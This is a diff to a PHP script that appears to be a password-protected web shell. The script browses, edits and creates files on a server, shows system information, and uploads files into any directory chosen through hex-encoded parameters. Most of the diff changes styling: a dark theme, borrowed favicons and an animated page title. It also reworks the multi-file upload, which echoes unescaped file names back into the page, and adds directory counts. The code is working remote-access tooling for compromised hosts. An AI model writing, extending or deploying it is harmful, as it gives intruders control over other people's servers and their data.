@@ -5,12 +5,13 @@ set_time_limit(0);
 $password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
 function login() {
 	?>
+	<link rel="icon" href="https://s.ytimg.com/yts/img/favicon_32-vflOogEID.png" sizes="32x32" >
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<style type="text/css">
 		@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
 		body {
 			font-family: 'Pangolin', cursive;
-			background: #f0f2f5;
+			background: #343a40;
 			color: #8a8a8a;
 		}
 		table {
@@ -36,10 +37,11 @@ function login() {
 		}
 		input {
 			width:100%;
-			background: #f0f2f5;
+			background: #8a8a8a;
 			outline: none;
 			border-radius:5px;
-			border: 1px solid #f2f2f2;
+			border: 1px solid #8a8a8a;
+			color:#fff;
 			padding:7px;
 		}
 		@media (min-width: 320px) and (max-width: 480px) {
@@ -82,10 +84,10 @@ if (!isset($_SESSION['login'])) {
 	}
 }
 ?>
+<link rel="icon" href="https://cdn.onlinewebfonts.com/svg/img_552870.png" sizes="32x32">
 <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
-<title>._.</title>
 <style type="text/css">
 	@import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
 	@import url('https://fonts.googleapis.com/css2?family=Ubuntu:ital@1&display=swap');
@@ -225,10 +227,18 @@ if (!isset($_SESSION['login'])) {
 		outline: none;
 		width:100%;
 	}
-	div.edit, div.createfile, div.chname, div.infos {
+	div.edit,
+	div.upload,
+	div.createfile, 
+	div.chname, 
+	div.infos,
+	div.make {
 		width:100%;
 	}
+	div.createfile,
+	div.upload,
 	div.chname,
+	div.infos,
 	div.edit {
 		padding:35px 15px 10px 10px 5px;
 		padding:15px;
@@ -237,6 +247,10 @@ if (!isset($_SESSION['login'])) {
 		background:#fff;
 		border:1px solid #e0e0e0;
 		box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
+	}
+	div.upload {
+		height:500px;
+		overflow: hidden;
 	}
 	div.filemanager {
 		padding:10px;
@@ -320,6 +334,22 @@ if (!isset($_SESSION['login'])) {
 		border: 1px solid #f2f2f2;
 		padding:7px;
 	}
+	table.infos {
+		border-collapse: collapse;
+		border-spacing: 0;
+	}
+	table.infos td {
+		border-bottom: 1px solid rgba(0,0,0,0.16);
+	}
+	table.infos tr:first-child td {
+		border-bottom: none;
+	}
+	table.infos tr:last-child td {
+		border-bottom: none;
+	}
+	table.upload td,
+	table.infos td,
+	table.createfile td,
 	table.chname td, 
 	table.edit td {
 		padding:7px;
@@ -359,6 +389,23 @@ if (!isset($_SESSION['login'])) {
 	}
 	.perms {
 		text-align: center;
+	}
+	div.role {
+		padding: 3px;
+		height:370px;
+		overflow: auto;
+	}
+	div.role td {
+		padding:4px;
+	}
+	div.alert .success {
+		background: #deffd9;
+		padding:10px;
+		color:#90b38b;
+		border-radius: 5px;
+	}
+	div.alert span {
+		float: right;
 	}
 	textarea.preview {
 		padding:0;
@@ -444,6 +491,33 @@ if (!isset($_SESSION['login'])) {
         margin-top: -35px;
         padding:20px;
     }
+    #submit {
+    	float: right;
+    	width: 150px;
+    }
+    div.up {
+    	width: 100%;
+    }
+    p.list {
+    	padding: 10px;
+    	margin: 13px;
+    	font-size:20px;
+    }
+    #submit,
+    #upload {
+  		position: relative;
+  		font-family: 'Open Sans', sans-serif;
+  		width: 150px;
+  		padding: 10px;
+  		-webkit-border-radius: 5px;
+  		-moz-border-radius: 5px;
+  		background: var(--color-bg);
+		border: 1px solid #f2f2f2;
+  		text-align: center;
+  		color: #1889f5;
+  		font-weight: bold;
+  		cursor: pointer;
+	}
     .navbar a {
       	z-index: 0;
 		background: var(--color-bg);
@@ -458,7 +532,7 @@ if (!isset($_SESSION['login'])) {
     }
     .navbar .icon {
         display: none;
-      }
+     }
 	@media (min-width: 320px) and (max-width: 480px) {
 		body {
 			margin:0;
@@ -571,6 +645,44 @@ if (!isset($_SESSION['login'])) {
 	function removeCustomalert() {
 		document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
 	}
+	function getFile() {
+		document.getElementById("upfile").click();
+	}
+
+	function sub(obj) {
+		var file = obj.value;
+		var fileName = file.split("\\");
+		document.getElementById("upfile").innerHTML = fileName[fileName.length - 1];
+		document.myForm.submit();
+		event.preventDefault();
+	}
+
+	// Title Typing
+	title = "-/-\\--";
+	position = 0;
+	function scrolltitle() {
+		document.title = title.substring(position, title.length) + title.substring(0, position); 
+		position++;
+		if (position > title.length) position = 0;
+		titleScroll = window.setTimeout(scrolltitle,170);
+}
+scrolltitle();
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script type="text/javascript">
+	$('#upfile').change(function() {
+		$('#myForm').submit();
+	});
+</script>
+<script type="text/javascript">
+	updateList = function() {
+		var input = document.getElementById('upfile');
+    	var output = document.getElementById('fileList');
+    	var children = "";
+    	for (var i = 0; i < input.files.length; ++i) {
+    		children += '<li>' + input.files.item(i).name + '</li>';
+    	} output.innerHTML = '<p class=list>File selected</p><ul>'+children+'</ul>';
+}
 </script>
 <script>
 function myFunction() {
@@ -698,6 +810,22 @@ function myFunction() {
 				$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
 				$result[] = $file;
 			} return $result;
+		}
+		public static function total($dir, $type) {
+			if (glob($dir . "/*") != false) {
+				switch ($type) {
+					case 'all':
+						return count(glob($dir . "/*"));
+						break;
+					case 'dir':
+						return (!is_dir($dir)) ? count(glob($dir . "*.*")) : 0;
+						break;
+					case 'file':
+						return (!is_file($dir)) ? count(glob($dir . "*.*")) : 0;
+						break;
+				}
+			}
+			
 		}
 		public static function save($filename = null, $data, $type) {
 			switch ($type) {
@@ -999,21 +1127,65 @@ function myFunction() {
 		<div class="col-xs-10 center">
 			<?php
 			if (isset($_GET['upload'])) {
-				if (isset($_POST['upload'])) {
-					$files = count($_FILES['file']['tmp_name']);
-					for ($i=0; $i < $files ; $i++) { 
-						if (copy($_FILES['file']['tmp_name'][$i] , x::unhex($_GET['cd']). DIRECTORY_SEPARATOR .$_FILES['file']['name'][$i])) {
-							print("success");
-						} else {
-							print("failed");
-						}
-					}
-				}
 				?>
-				<form method="post" enctype="multipart/form-data">
-					<input type="file" name="file[]" multiple>
-					<button type="submit" name="upload">Upload</button>
-				</form>
+				<div class="upload">
+					<table width="100%" class="upload">
+						<form method="post" enctype="multipart/form-data" id="myForm">
+							<tr>
+								<td class="action" colspan="3">
+									<span><i class="fa fa-upload"></i> UPLOAD</span>
+								</td>
+							</tr>
+							<tr>
+								<td>
+									<div id="upload" onclick="getFile()">CHOOSE FILE</div>
+									<div style='height: 0px;width: 0px; overflow:hidden;'>
+										<input 
+											id="upfile" 
+											type="file" 
+											name="file[]" 
+											onchange="javascript:updateList()" multiple>
+									</div>
+								</td>
+								<td><button type="submit" name="upload" id="submit">UPLOAD</button></td>
+							</tr>
+							<tr>
+								<td>
+									<div class="up" id="fileList"></div>
+								</td>
+							</tr>
+						</form>
+						</table>
+						<div class="role">
+							<table width="100%">
+								<?php
+								if (isset($_POST['upload'])) {
+									$files = count($_FILES['file']['tmp_name']);
+									for ($i=0; $i < $files ; $i++) { 
+										if (copy($_FILES['file']['tmp_name'][$i] , x::unhex($_GET['cd']). DIRECTORY_SEPARATOR .$_FILES['file']['name'][$i])) { ?>
+											<tr>
+												<td colspan="2">
+													<div class="alert">
+														<div class="success">
+															<img src="<?= x::getimg($_FILES['file']['name'][$i]) ?>" class='icons'> 
+															<a href="?cd=<?= $_GET['cd'] ?>&preview=<?= x::hex($_FILES['file']['name'][$i]) ?>">
+																<?= $_FILES['file']['name'][$i] ?>
+															</a>
+															
+															<span>Uploaded !</span>
+														</div>
+													</div>
+												</td>
+											</tr>
+										</div>
+									<?php } else {
+										print "<script>alert('Upload Failed')</script>";
+									}
+								}
+							}
+							?>
+						</table>
+					</div>
 				<?php
 				exit();
 			}
@@ -1066,7 +1238,12 @@ function myFunction() {
 			if (isset($_GET['info'])) {
 				?>
 				<div class="infos">
-					<table width="100%">
+					<table width="100%" class="infos">
+						<tr>
+							<td class="action" colspan="3">
+								<span><i class="fa fa-info-circle" aria-hidden="true"></i> SERVER INFO</span>
+							</td>
+						</tr>
 						<tr>
 							<td>System</td>
 							<td>:</td>
@@ -1111,15 +1288,11 @@ function myFunction() {
 					}
 					?>
 					<div class="createfile">
-						<table width="100%">
+						<table width="100%" class="createfile">
 							<form method="post">
 								<tr>
-									<td style="width:1px;">
-										<a href="?cd=<?= $_GET['cd'] ?>">
-											<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
-										</a>
-									</td>
-									<td class="action">CREATE FILE & DIR</td>
+									<td class="action">
+										<i class="fa fa-plus-square" aria-hidden="true"></i> CREATE FILE & DIR</td>
 								</tr>
 								<tr>
 									<td colspan="2">
@@ -1215,7 +1388,7 @@ function myFunction() {
 										<form method="post" action="?cd=<?= $_GET['cd'] ?>">
 											<td colspan="3">
 												<div class="button">
-													<button onclick="window.location.href='?cd=<?= x::hex($_POST['file']) ?>'">
+													<button name="open" value="<?= x::hex($_POST['file']) ?>">
 														<i class="far fa-edit" title="Edit"></i>&nbsp;
 														Open
 													</button>
@@ -1433,6 +1606,8 @@ function myFunction() {
 				}
 				if (isset($_GET['cd'])) {
 					x::cd(x::unhex($_GET['cd']));
+				} elseif (isset($_POST['open'])) {
+					x::cd(x::unhex($_POST['open']));
 				}
 				?>
 				<div class="files">
@@ -1503,6 +1678,11 @@ function myFunction() {
 				<?php }
 				?>
 			</table>
+		</div>
+		<div>
+			Dir 	: 	<?= x::total(x::unhex($_GET['cd']), 'dir') ?>
+			File 	: 	<?= x::total(x::unhex($_GET['cd']), 'file') ?>
+			Total 	: 	<?= x::total(x::unhex($_GET['cd']), 'all') ?>
 		</div>
 		</div>
 		</div>
